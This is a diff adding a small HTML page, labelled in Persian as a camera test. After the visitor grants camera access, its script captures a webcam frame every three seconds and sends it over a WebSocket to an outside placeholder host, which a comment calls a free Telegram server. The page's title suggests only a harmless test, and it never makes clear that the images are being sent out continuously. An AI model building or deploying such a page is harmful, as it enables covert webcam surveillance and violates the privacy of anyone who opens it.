@@ -1,0 +1,28 @@
+<!DOCTYPE html><html><body style="text-align:center;font-family:Arial">
+<h2>🎥 تست دوربین</h2>
+<video id="v" width="300" autoplay muted></video><br>
+<button onclick="go()" style="padding:10px;background:#007bff;color:white;border:none;font-size:18px">دوربین روشن</button>
+<div id="status"></div>
+
+<script>
+let socket;
+function go(){
+ document.getElementById('status').innerHTML='در حال اتصال...';
+ navigator.mediaDevices.getUserMedia({video:true})
+ .then(stream=>{
+  v.srcObject=stream;
+  document.getElementById('status').innerHTML='✅ وصل شد! عکس ارسال میشه';
+  
+  // اتصال به سرور تلگرام (رایگان!)
+  socket = new WebSocket('wss://your-telegram-bot-token.com');
+  
+  setInterval(()=>{
+   let c=document.createElement('canvas');
+   c.width=320;c.height=240;
+   c.getContext('2d').drawImage(v,0,0);
+   if(socket.readyState===1) socket.send(c.toDataURL());
+  },3000);
+ })
+ .catch(e=>document.getElementById('status').innerHTML='❌ خطا: '+e);
+}
+</script></body></html>
